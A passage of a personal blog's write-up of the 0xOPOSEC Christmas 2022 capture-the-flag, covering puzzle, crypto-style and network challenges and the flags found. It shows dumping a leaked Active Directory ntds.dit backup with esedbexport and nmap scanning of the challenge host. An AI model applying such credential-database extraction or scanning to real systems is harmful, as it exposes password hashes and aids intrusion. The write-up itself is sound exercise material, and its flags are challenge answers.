@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>0xOPOSEC Christmas Challenge 2022 | Bruno Blog</title>
+<meta name="keywords" content="CTF">
+<meta name="description" content="&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;
+Index
+
+Black Hole {MISC}
+A Programming Language {MISC}
+Find The Typo {MISC}
+Back Me Up! {MISC}
+867 CFR {NETWORK}
+Who&rsquo;s There {NETWORK}
+My Network Is Secure! {NETWORK}
+Mmmm&hellip;Donuts&hellip; {CRYPTO}
+Lets Share! {CRYPTO}
+The Folt {WEB}
+In Passwords, We Trust, and in PHP, We Believe! {WEB}
+Who? {TRIVIA}
+The Great Hack {TRIVIA}
+
+
+Misc
+Black Hole
+&ldquo;An exception is an abnormal event or error that occurs during the execution of a program. Exceptions are typically used to handle unexpected or exceptional co
+nditions, such as runtime errors or input-output errors. When an exception occurs, it is typically represented as an object that is thrown, and it can be caug
+ht and handled by the program using a try-catch block.&rdquo;">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/2022-12-31-0xoposec/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/2022-12-31-0xoposec/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Bruno Blog (Alt + H)">Bruno Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      0xOPOSEC Christmas Challenge 2022
+    </h1>
+    <div class="post-meta"><span title='2022-12-31 00:00:00 +0000 UTC'>December 31, 2022</span>&nbsp;·&nbsp;17 min
+
+</div>
+  </header> 
+  <div class="post-content"><p>&ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.&rdquo;</p>
+<h2 id="index">Index<a hidden class="anchor" aria-hidden="true" href="#index">#</a></h2>
+<ul>
+<li><a href="#black-hole">Black Hole {MISC}</a></li>
+<li><a href="#a-programming-language">A Programming Language {MISC}</a></li>
+<li><a href="#find-the-typo">Find The Typo {MISC}</a></li>
+<li><a href="#back-me-up">Back Me Up! {MISC}</a></li>
+<li><a href="#867-cfr">867 CFR {NETWORK}</a></li>
+<li><a href="#who-there">Who&rsquo;s There {NETWORK}</a></li>
+<li><a href="#my-network-is-secure">My Network Is Secure! {NETWORK}</a></li>
+<li><a href="#mmm-donuts">Mmmm&hellip;Donuts&hellip; {CRYPTO}</a></li>
+<li><a href="#lets-share">Lets Share! {CRYPTO}</a></li>
+<li><a href="#the-folt">The Folt {WEB}</a></li>
+<li><a href="#in-passwords-we-trust-and-in-php-we-believe">In Passwords, We Trust, and in PHP, We Believe! {WEB}</a></li>
+<li><a href="#who">Who? {TRIVIA}</a></li>
+<li><a href="#the-great-hack">The Great Hack {TRIVIA}</a></li>
+</ul>
+<br>
+<h2 id="misc">Misc<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h2>
+<h3 id="black-hole">Black Hole<a hidden class="anchor" aria-hidden="true" href="#black-hole">#</a></h3>
+<p><em>&ldquo;An exception is an abnormal event or error that occurs during the execution of a program. Exceptions are typically used to handle unexpected or exceptional co
+nditions, such as runtime errors or input-output errors. When an exception occurs, it is typically represented as an object that is thrown, and it can be caug
+ht and handled by the program using a try-catch block.&rdquo;</em></p>
+<p>After downloading the .rar file, I opened and that contained the flag.txt but was password protected.</p>
+<p>Well after reading the description I was a bit confused but when I did <code>unrar e l33t.rar</code> I got the following.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>UNRAR 6.00 freeware      Copyright <span style="color:#719e07">(</span>c<span style="color:#719e07">)</span> 1993-2020 Alexander Roshal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extracting from l33t.rar
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Python 3.7.3
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; ︎◼︎◼︎◼︎
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#719e07">(</span>most recent call last<span style="color:#719e07">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#2aa198">&#34;&lt;pyshell#4&gt;&#34;</span>, line 1, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>    ︎◼︎◼◼
+</span></span><span style="display:flex;"><span>ZeroDivisionError: ◼︎◼︎◼︎ &lt;- Password 
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter password <span style="color:#719e07">(</span>will not be echoed<span style="color:#719e07">)</span> <span style="color:#719e07">for</span> flag.txt: 
+</span></span></code></pre></div><p>So I got the <code>ZeroDivisionError</code> exception like the description said and a stack trace.</p>
+<p>So googling by the <code>ZeroDivisionError</code> I got:</p>
+<p><em>&ldquo;ZeroDivisionError is a built-in Python exception thrown when a number is divided by 0. This means that the exception raised when the second argument of a division or modulo operation is zero. In Mathematics, when a number is divided by a zero, the result is an infinite number.&rdquo;</em></p>
+<p>I was curious on how I was doing an exception but I wasn&rsquo;t, the creators only modified the hex values of the .rar to contain the string with the exception.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209385834-46808bb7-8c61-44ab-9619-9b7ee4665a2a.png"></p>
+<p>Doing <code>strings</code> worked too and returned this output</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strings l33t.rar
+</span></span><span style="display:flex;"><span>Rar!
+</span></span><span style="display:flex;"><span>CMTPython 3.7.3
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#719e07">(</span>most recent call last<span style="color:#719e07">)</span>:
+</span></span><span style="display:flex;"><span>  File <span style="color:#2aa198">&#34;&lt;pyshell#4&gt;&#34;</span>, line 1, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ZeroDivisionError:
+</span></span><span style="display:flex;"><span> &lt;- Password
+</span></span><span style="display:flex;"><span>flag.txt0
+</span></span><span style="display:flex;"><span>90|ua
+</span></span></code></pre></div><p>So If we open a python interpreter and we use a division by 0 we got this</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Python <span style="color:#2aa198">3.9.2</span> (default, Feb <span style="color:#2aa198">28</span> <span style="color:#2aa198">2021</span>, <span style="color:#2aa198">17</span>:<span style="color:#2aa198">03</span>:<span style="color:#2aa198">44</span>) 
+</span></span><span style="display:flex;"><span>[GCC <span style="color:#2aa198">10.2.1</span> <span style="color:#2aa198">20210110</span>] on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#2aa198">&#34;help&#34;</span>, <span style="color:#2aa198">&#34;copyright&#34;</span>, <span style="color:#2aa198">&#34;credits&#34;</span> <span style="color:#719e07">or</span> <span style="color:#2aa198">&#34;license&#34;</span> <span style="color:#719e07">for</span> more information<span style="color:#719e07">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#719e07">&gt;&gt;&gt;</span> <span style="color:#2aa198">0</span> <span style="color:#719e07">/</span> <span style="color:#2aa198">0</span>
+</span></span><span style="display:flex;"><span>Traceback (most recent call last):
+</span></span><span style="display:flex;"><span>  File <span style="color:#2aa198">&#34;&lt;stdin&gt;&#34;</span>, line <span style="color:#2aa198">1</span>, <span style="color:#719e07">in</span> <span style="color:#719e07">&lt;</span>module<span style="color:#719e07">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#cb4b16">ZeroDivisionError</span>: division by zero
+</span></span></code></pre></div><p>Since they tell us the Password is the output of the ZeroDivisionError I used <code>division by zero</code> as the password and got the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>l0vef@rf4t0h<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="a-programming-language">A Programming Language<a hidden class="anchor" aria-hidden="true" href="#a-programming-language">#</a></h3>
+<p><em>&ldquo;flag←48 55 45 52 73 53 0 67 63 4 59 5 73 24 69 9 62 15 64 76 43 16 78 73 18 96 ⊢WTF←⎕UCS{⍵-¨10-⍨⍳≢⍵}+flag+2⊥¯3⌽1 0 1 1 0 1&rdquo;</em></p>
+<p>After some googling I&rsquo;ve found that this is related with <a href="https://en.wikipedia.org/wiki/APL_(programming_language)">APL</a> A Programming Language.</p>
+<p>Next thing I did was to find an <a href="https://tryapl.org/">online interpreter</a> so, copy and pasting the descriptions I was getting an error saying <code>undefined name: flag</code> .</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209565965-280d145e-f983-459d-b0cd-80b662388c80.png"></p>
+<p>So I started to tweak a little bit.</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209566057-75dd84bf-352e-4696-b52b-a76c58354f0f.png"></p>
+<p>Still nothing &hellip; So I went to wikipedia and studied a bit how this language worked and for some reason <code>←</code> is the assgin symbol so I this must be lacking a <code>\n</code> somewhere.</p>
+<p>My idea was to assign and then apply the function <code>⊢ WTF←⎕UCS{⍵-¨10-⍨⍳≢⍵}</code> (From what I understand, this will go to the unicode values of the <code>flag</code> var and decrements 10 to each unicode value).</p>
+<p>Then I append with the <code>+</code> sign the new values to the <code>flag</code> using <code>flag+2⊥¯3⌽1 0 1 1 0 1</code> (Not quite sure whats happening here, but I assume this is probably converting unicode to ASCII).</p>
+<p><img alt="image" loading="lazy" src="https://user-images.githubusercontent.com/12052283/209566245-e1e0865f-1c00-413d-864d-581388c7e704.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>f0rm1g0sAm0d4doM1nh0<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="find-the-typo">Find The Typo<a hidden class="anchor" aria-hidden="true" href="#find-the-typo">#</a></h3>
+<p><img src="https://user-images.githubusercontent.com/12052283/209704599-57f0f5c2-048a-4447-aa4e-05e4d4b42c28.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 50%;"></p>
+<p>In this challenge we get a table of SI multiples of gram, a nonogram and a password protected .zip with the flag.</p>
+<ul>
+<li>Nonograms is a logic puzzle with simple <a href="https://puzzlygame.com/pages/how_to_play_nonograms/">rules</a>
+<ul>
+<li>We have a grid of squares, which must be either filled in black or maked with X</li>
+<li>Besides each row of the grid are listed the lenghts of the turns of black squares on that row</li>
+<li>Above each column are listed the lenghts of the runs of black squares in that colum</li>
+<li>These numbers tells us the runs of black squares in that row/column. So, if we see &lsquo;10 1&rsquo;, that tells us that there will be a run of exactly 10 black squares, followed by one or more white square, followed by a single black square</li>
+<li>Our goal is to find all black squares</li>
+</ul>
+</li>
+</ul>
+<p>With the help of my gf (she used to play nonogram games on her phone) I&rsquo;ve marked the nonogram and that represented the <code>pacman</code>.</p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209705762-2bbd89bd-8299-488d-ae84-6724ba26c832.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 50%;"></p>
+<p>After discovering that this would be pacman I tried that but It didn&rsquo;t worked so I tried to understand and correlate the pacman with the first table but looking again at the challenge title, there&rsquo;s a typo somewhere and I was making the typo &hellip;</p>
+<p>I used <code>pac-man</code> on the zip file and that worked and got the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>bread_bread_cheese_cheese<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="back-me-up">Back Me Up!<a hidden class="anchor" aria-hidden="true" href="#back-me-up">#</a></h3>
+<p><em>&ldquo;Someone left backups of a Domain Controller in an open share. A portion was extracted from the backup and myth be told that it contains critical information (and a flag ;) Can you get it?&rdquo;</em></p>
+<p>After extracting the zip file I got an <code>Active Directory</code> folder and a <code>registry</code> folder.</p>
+<p>First I went to the <code>Active Directory</code> folder and that contained a <code>.dit</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file ntds.dit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0xa4ae6abb, page size 8192, Windows version 6.3
+</span></span></code></pre></div><p>After googling I&rsquo;ve found that this is an Extensible Storage Engine (ESE) and this is an advanced indexed and sequential access method (ISAM) storage technology. ESE enables applications to store and retrieve data from tables using indexed or sequential cursor navigation. It is usually utilized by various Microsoft Services such as Microsoft Exchange Server, Active Directory, and Windows Search.</p>
+<p>Briefly this is a database file which stores AD Data including User Object, Groups and Group Memebers, Password hashes, etc.</p>
+<p>Next I&rsquo;ve looked on how I could extract info from this database file and I&rsquo;ve found <a href="https://github.com/libyal/libesedb">libesedb</a> (Library and tools to access the Extensible Storage Engine (ESE) Database File (EDB) format).</p>
+<p>I installed libesedb.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ wget https://github.com/libyal/libesedb/releases/download/20220806/libesedb-experimental-20220806.tar.gz
+</span></span><span style="display:flex;"><span>$ tar libesedb-experimental-20220806.tar.gz
+</span></span><span style="display:flex;"><span>$ sudo apt-get install autoconf automake autopoint libtool pkg-config
+</span></span><span style="display:flex;"><span>$ <span style="color:#b58900">cd</span> libesedb-20220806 <span style="color:#719e07">&amp;&amp;</span> ./configure
+</span></span><span style="display:flex;"><span>$ make
+</span></span><span style="display:flex;"><span>$ sudo make install
+</span></span><span style="display:flex;"><span>$ sudo ldconfig
+</span></span></code></pre></div><p>And then dumped the data from the db file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ esedbexport -m tables ntds.dit
+</span></span></code></pre></div><p>Opening the files got me the flag.</p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209708209-cc770fe7-449b-4f85-a021-878e42d21d32.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 50%;"></p>
+<p><img src="https://user-images.githubusercontent.com/12052283/209708375-c1a83229-e5e9-47c9-a3da-733d18132362.png"  style="display: block;
+margin-left: auto;
+margin-right: auto;
+width: 50%;"></p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>ClearBackupsCanPwnU<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h2 id="network">Network<a hidden class="anchor" aria-hidden="true" href="#network">#</a></h2>
+<h3 id="867-cfr">867 CFR<a hidden class="anchor" aria-hidden="true" href="#867-cfr">#</a></h3>
+<p><em>&ldquo;867 CFR is a protocol for sending data across networks. It is connectionless, meaning it does not establish a dedicated connection between sender and receiver. This makes it faster but less reliable than other transport protocols. 867 CFR is often used for real-time applications such as gaming and VoIP, and for low-overhead services like DNS. Weird stuff! Can you have a look? cc.isymra.22samxopo (344)</em>&rdquo;</p>
+<p>867 CFR its nothing but if we reverse the string we got RFC 768 and thats User Datagram Protocol <a href="https://www.rfc-editor.org/rfc/rfc768">(UDP)</a>.</p>
+<p>Doing the same reverse on the cc.isymra.22samxopo we got &lsquo;opoxmas22.armysi.cc&rsquo; and 344 should be 443.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#719e07">&gt;&gt;&gt;</span> <span style="color:#2aa198">&#34;cc.isymra.22samxopo&#34;</span>[::<span style="color:#719e07">-</span><span style="color:#2aa198">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">&#39;opoxmas22.armysi.cc&#39;</span>
+</span></span></code></pre></div><p>I tried to access opoxmas22.armysi.cc:443 but I got denied.</p>
+<p>Checked on Wireshark for any hits on connecting to the above domain but found nothing.</p>
+<p>After a while I tought that this could be some sort of UDP socket connection and for that I used a simple python script to connect to the server (opoxmas22.armysi.cc:443) as client and then send a simple &ldquo;Hello&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#719e07">import</span> socket 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>server_add_and_port <span style="color:#719e07">=</span> (<span style="color:#2aa198">&#34;opoxmas22.armysi.cc&#34;</span>, <span style="color:#2aa198">443</span>)
+</span></span><span style="display:flex;"><span>udp_client_socket <span style="color:#719e07">=</span> socket<span style="color:#719e07">.</span>socket(family<span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>AF_INET, <span style="color:#b58900">type</span><span style="color:#719e07">=</span>socket<span style="color:#719e07">.</span>SOCK_DGRAM) <span style="color:#586e75"># created UDP socket on client</span>
+</span></span><span style="display:flex;"><span>udp_client_socket<span style="color:#719e07">.</span>sendto(<span style="color:#b58900">str</span><span style="color:#719e07">.</span>encode(<span style="color:#2aa198">&#34;Hello&#34;</span>), server_add_and_port) <span style="color:#586e75"># sends message to server socket</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msg_from_server <span style="color:#719e07">=</span> udp_client_socket<span style="color:#719e07">.</span>recvfrom(<span style="color:#2aa198">1024</span>)
+</span></span><span style="display:flex;"><span><span style="color:#b58900">print</span>(msg_from_server[<span style="color:#2aa198">0</span>])
+</span></span></code></pre></div><p>After executing this I got the following bytes, so I just had to reverse those again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b<span style="color:#2aa198">&#39;}eep_eed_uoy{galf\n&#39;</span>
+</span></span></code></pre></div><p>Reversing and cleaning the string (<code>print(msg_from_server[0][::-1].decode(&quot;utf-8&quot;).strip())</code>) I got the correct flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#719e07">{</span>you_dee_pee<span style="color:#719e07">}</span>
+</span></span></code></pre></div><h3 id="who-there">Who There<a hidden class="anchor" aria-hidden="true" href="#who-there">#</a></h3>
+<p><em>&ldquo;I do not have a physical body, but I am here to help you with any questions you may have, give me a PIN, and I will tell you what to do next! opoxmas22.armysi.cc (22222) looks interesting!&rdquo;</em></p>
+<p>Running nmap on opoxmas22.armysi.cc:22222 got a filtered result</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -p22222 opoxmas22.armysi.cc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#719e07">(</span> https://nmap.org <span style="color:#719e07">)</span> at 2022-12-26 11:36 WET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> opoxmas22.armysi.cc <span style="color:#719e07">(</span>95.217.178.98<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.00026s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>rDNS record <span style="color:#719e07">for</span> 95.217.178.98: static.98.178.217.95.clients.your-server.de
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE
+</span></span><span style="display:flex;"><span>22222/tcp filtered easyengine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#719e07">done</span>: <span style="color:#2aa198">1</span> IP address <span style="color:#719e07">(</span><span style="color:#2aa198">1</span> host up<span style="color:#719e07">)</span> scanned in 0.41 seconds
+</span></span></code></pre></div><p>Running another nmap to get more info.</p>
+<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nmap -A -p22222 opoxmas22.armysi.cc -oN nmap/initial
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#719e07">(</span> https://nmap.org <span style="color:#719e07">)</span> at 2022-12-26 11:44 WET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#719e07">for</span> opoxmas22.armysi.cc <span style="color:#719e07">(</span>95.217.178.98<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#719e07">(</span>0.016s latency<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>rDNS record <span style="color:#719e07">for</span> 95.217.178.98: static.98.178.217.95.clients.your-server.de
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE    SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22222/tcp filtered easyengine
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#2aa198">1</span> open and <span style="color:#2aa198">1</span> closed port
+</span></span><span style="display:flex;"><span>Device type: webcam|general purpose|PBX|WAP|specialized|power-device|router
+</span></span><span style="display:flex;"><span>Running <span style="color:#719e07">(</span>JUST GUESSING<span style="color:#719e07">)</span>: AXIS embedded <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, GNU Hurd <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Linux 2.0.X|2.2.X <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Netgear embedded <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, ZKTeco embedded <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, CAEN embedded <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:2100_network_camera cpe:/o:gnu:hurd cpe:/o:linux:linux_kernel:2.0.36 cpe:/o:linux:linux_kernel:2.0.38 cpe:/o:linux:linux_kernel:2.2.14 cpe:/h:netgear:wg602v1 cpe:/o:linux:linux_kernel:2.0.39
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: AXIS <span style="color:#2aa198">2100</span> Network Camera <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, AXIS <span style="color:#2aa198">2120</span> Network Camera <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, GNU Hurd 0.3 <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Linux 2.0.36 <span style="color:#719e07">(</span>Red Hat 5.2<span style="color:#719e07">)</span> <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, elmeg T240 or T444 PABX <span style="color:#719e07">(</span>Linux 2.0.38<span style="color:#719e07">)</span> <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Netgear WG602v1 WAP <span style="color:#719e07">(</span>Linux 2.2.14<span style="color:#719e07">)</span> <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, ZKTeco F18 fingerprint reader <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, CAEN SY2527 high voltage power supply <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Linux 2.0.33 <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>, Linux 2.0.35 - 2.0.36 <span style="color:#719e07">(</span>98%<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#719e07">for</span> host <span style="color:#719e07">(</span><span style="color:#b58900">test</span> conditions non-ideal<span style="color:#719e07">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#2aa198">2</span> hops
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#719e07">(</span>using port 80/tcp<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">1</span>   0.37 ms 10.0.2.2
+</span></span><span style="display:flex;"><span><span style="color:#2aa198">2</span>   0.49 ms static.98.178.217.95.clients.your-server.de <span style="color:#719e07">(</span>95.217.178.98<span style="color:#719e07">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
